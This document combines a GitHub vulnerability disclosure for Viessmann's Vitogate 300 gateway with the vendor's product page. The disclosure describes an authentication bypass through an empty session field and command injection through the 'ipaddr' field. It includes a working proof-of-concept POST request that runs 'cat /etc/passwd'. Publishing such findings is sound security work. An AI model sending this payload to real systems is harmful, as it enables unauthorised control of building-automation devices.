=== Content from github.com_d536b3c5_20250115_085415.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPush3AX%2Fvul%2Fblob%2Fmain%2Fviessmann%2FVitogate300_RCE.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPush3AX%2Fvul%2Fblob%2Fmain%2Fviessmann%2FVitogate300_RCE.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Push3AX%2Fvul)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Push3AX](/Push3AX)
/
**[vul](/Push3AX/vul)**
Public

* [Notifications](/login?return_to=%2FPush3AX%2Fvul) You must be signed in to change notification settings
* [Fork
  3](/login?return_to=%2FPush3AX%2Fvul)
* [Star
   9](/login?return_to=%2FPush3AX%2Fvul)

* [Code](/Push3AX/vul)
* [Issues
  0](/Push3AX/vul/issues)
* [Pull requests
  0](/Push3AX/vul/pulls)
* [Actions](/Push3AX/vul/actions)
* [Projects
  0](/Push3AX/vul/projects)
* [Security](/Push3AX/vul/security)
* [Insights](/Push3AX/vul/pulse)

Additional navigation options

* [Code](/Push3AX/vul)
* [Issues](/Push3AX/vul/issues)
* [Pull requests](/Push3AX/vul/pulls)
* [Actions](/Push3AX/vul/actions)
* [Projects](/Push3AX/vul/projects)
* [Security](/Push3AX/vul/security)
* [Insights](/Push3AX/vul/pulse)

## Files

 main
## Breadcrumbs

1. [vul](/Push3AX/vul/tree/main)
2. /[viessmann](/Push3AX/vul/tree/main/viessmann)
/
# Vitogate300\_RCE.md

Copy path Blame  Blame
## Latest commit

## History

[History](/Push3AX/vul/commits/main/viessmann/Vitogate300_RCE.md)66 lines (33 loc) · 2.6 KB main
## Breadcrumbs

1. [vul](/Push3AX/vul/tree/main)
2. /[viessmann](/Push3AX/vul/tree/main/viessmann)
/
# Vitogate300\_RCE.md

Top
## File metadata and controls

* Preview
* Code
* Blame

66 lines (33 loc) · 2.6 KB[Raw](https://github.com/Push3AX/vul/raw/refs/heads/main/viessmann/Vitogate300_RCE.md)
# Information

**Affected product:** Vitogate 300

**Vendor of the product:** Viessmann

**Product page:** <https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html>

**Affected system version:** 2.1.3.0 and lower

**Firmware download address:** <https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb/release-historie.html>

**Reported by:** WentaoYang (pushe4x@gmail.com)

# Description

Vitogate 300 is a gateway for connecting the Viessmann LON to the BACnet or Modbus. An issue in the component /cgi-bin/vitogate.cgi allows unauthenticated attacker to bypass authentication and execute arbitrary commands via a crafted request.

# Vulnerability details

The vulnerability was detected in the `/ugw/httpd/html/cgi-bin/vitogate.cgi` binary.

## Authentication bypass vulnerability

Analyzing the `/ugw/httpd/html/cgi-bin/vitogate.cgi` , It accepts a data in JSON format through HTTP POST. Then use `isValidSession` function to check the `session` item to determine whether the client has logged in.

[![image-20230820044139157](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820044139157.png)](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820044139157.png)

However, the `isValidSession` function only checks whether the `session` item exists, but not whether the value is valid。

[![image-20230820044200248](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820044200248.png)](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820044200248.png)

Therefore, attacker can set an empty `session` item to bypass the authentication.

## Command injection vulnerability

When the `form` field in JSON data is  `form-4-7` or  `form-4-8`, the corresponding function with the same name will be called.

In this two functions, the contents of the `ipaddr` will be concatenated into the command string without any filtering. Then, the `popen` will be called with the command string executed as an argument.

[![image-20230820041501154](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820041501154.png)](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820041501154.png)

To sum up, an unauthenticated attacker can set an empty `session` field to bypass the authentication, gain administrator privileges, and then inject arbitrary malicious commands using `ipaddr` field, thus gaining control of the remote systems.

# POC:

Send the following request to the vulnerable server:

```
POST /cgi-bin/vitogate.cgi HTTP/1.1
Host: VULNERABLE_SERVER_IP
Content-Length: 76
Content-Type: application/json

{"method":"put","form":"form-4-8","session":"","params":{"ipaddr":"1;cat /etc/passwd"}}

```

After the attack, the output of the commands will show in the HTTP response:

[![image-20230820051743463](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820051743463.png)](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820051743463.png)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from connectivity.viessmann.com_b20b7a54_20250115_085414.html ===


# Vitogate 300 BN/MB

Important product functions

The Viessmann Vitogate 300 BN/MB allows data exchange with control systems both over BACnet IP or BACnet MS/TP, as well as over Modbus TCP/IP or Modbus RS 485, and can thus easily hook up one or more Viessmann heat generators with Vitotronic control to an automation system. The Vitogate 300 has an integrated LON interface for communicating with the Viessmann heat generators.

The determination of the data points to be transmitted is made easily and quickly using the integrated configuration tool, which can be accessed via the integrated Web server. Extensive possibilities for filtering and selection of the desired data points increases the transparency in determining the correct data points. The integrated configuration tool can also be used for configuring the BACnet or Modbus communications parameters. For increasing the data security, the integrated configuration tool asks for authorisation for access.

**Integrated Web server as configuration tool

(Determination of the data points and communications parameters)**

It is possible to import the configuration data into the appliance or export it from the appliance, both via the configuration tool as well as via the USB interface.

If the BACnet interface is used, the Vitogate 300 appliance also supports the BACnet building controller functions Time Scheduling and Trending.

The appliance has gateway diagnosis functions and integrated online help.

![Integrierter Web-Server als Konfigurationstool](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/Integrated-web-server.png/_jcr_content/renditions/original.image_file.60.26.file/Integrated-web-server.png)

Vitogate 300 system in a BACnet network

![Vitogate 300 system in a BACnet network](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/System-view-Vitogate-300-BACnet.png/_jcr_content/renditions/original.image_file.60.26.file/System-view-Vitogate-300-BACnet.png)

There is further information on the BACnet protocol standard on

* [bacnet.org](https://www.bacnet.org/)
* [big-eu.org](https://www.big-eu.org/)

Vitogate 300 system schematic in a Modbus network

![Vitogate 300 system schematic in a Modbus network](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/System-view-Vitogate-300-Modbus.png/_jcr_content/renditions/original.image_file.60.26.file/System-view-Vitogate-300-Modbus.png)

There is further information on the Modbus protocol standard on

* [modbus.org](https://www.modbus.org/)

Printed matter

* [Installation and servicing instructions (pdf 555 KB)](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/pdf/2025/vitogate-300-installation-service-instructions-en.pdf/_jcr_content/renditions/original.media_file.download_attachment.file/vitogate-300-installation-service-instructions-en.pdf)
* [BACnet – Protocol Implementation Conformance Statement PICS (pdf 433 KB)](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/pdf/Datasheet-BACnet-PICS.pdf/_jcr_content/renditions/original.media_file.download_attachment.file/Datasheet-BACnet-PICS.pdf)
* [Supported control units and heat generators (pdf 111 KB)](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/pdf/list-of-supported-heat-generators-vitogate-300.pdf/_jcr_content/renditions/original.media_file.download_attachment.file/list-of-supported-heat-generators-vitogate-300.pdf)
* [BACnet usage notes (pdf 3 MB)](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/pdf/BACnet-usage-notes.pdf/_jcr_content/renditions/original.media_file.download_attachment.file/BACnet-usage-notes.pdf)
* [Modbus instructions for use (pdf 252 KB)](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/pdf/Modbus-instructions-for-use.pdf/_jcr_content/renditions/original.media_file.download_attachment.file/Modbus-instructions-for-use.pdf)
* [Application information for various heat generators (pdf 493 KB)](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/pdf/2025/vitogate-300-datasheet-en.pdf/_jcr_content/renditions/original.media_file.download_attachment.file/vitogate-300-datasheet-en.pdf)
* [License information for open source components (pdf 972 KB)](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/pdf/License-information-open-source-components.pdf/_jcr_content/renditions/original.media_file.download_attachment.file/License-information-open-source-components.pdf)
* [Technical note (pdf 503 KB)](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/pdf/Technical-note.pdf/_jcr_content/renditions/original.media_file.download_attachment.file/Technical-note.pdf)
* [Online-help (pdf 498 KB)](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/pdf/online-help-vitogate-300-en.pdf/_jcr_content/renditions/original.media_file.download_attachment.file/online-help-vitogate-300-en.pdf)

Vitogate 300 process steps: Design - Installation - Commissioning - Configuration

![Vitogate 300 process steps](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/WAGO-gateway-process-steps.png/_jcr_content/renditions/original.image_file.60.26.file/WAGO-gateway-process-steps.png)

System requirements

Please note the following system requirements:

* When the Vitogate 300 is being used, the simultaneous use of Vitoguide (for example, via the integrated LAN interface or Vitoconnect) is not possible.
* The data points for the external set default value for the set boiler temperature and burner rating (technical ID's 0xA380, boiler/system set value status and value) should only be configured or used if an external set value specification via the control system is required.

Data point lists

Please send your inquiries regarding sending data point lists directly to the Viessmann sales office looking after you.

Vitogate 300 internet demo setup

This demo is currently not available.

Update

**Note**:

Due to a system change, the update process has been adapted and from version 3.0.0.0 a different update file must be used.

* Update file for Vitogate 300 with a software version up to 2.1.3.0: [Update file](/content/dam/public-micro/connectivity/vitogate/en/vitogate-300/vitogate-300-bn-mb/update.ugw/_jcr_content/renditions/original.media_file.download_attachment.file/update.ugw)

Attention! The update process can take up to 30 minutes and the Vitogate must not be switched off during this time.

* Update file for Vitogate 300 with a software version from 3.0.0.0: [Update file](/content/dam/public-micro/connectivity/vitogate/de/vitogate-300/vitogate-300-bn-mb/pdf/2025/vitogate-3.0.1.0-7631d5eb-3.0.1.0-00d74ecc-micro7-viessmann.upd.zip/_jcr_content/renditions/original.media_file.download_attachment.file/vitogate-3.0.1.0-7631d5eb-3.0.1.0-00d74ecc-micro7-viessmann.upd.zip)

* [Company details](https://www.viessmann.co.uk/en/company-details.html)
* [Data Protection](https://www.viessmann.co.uk/en/data-protection.html)
* Cookie & Tracking
* [Copyright](https://www.viessmann.co.uk/en/copyright.html)
* [Modern Slavery Statement](https://www.viessmann.co.uk/en/modern-slavery-statement.html)


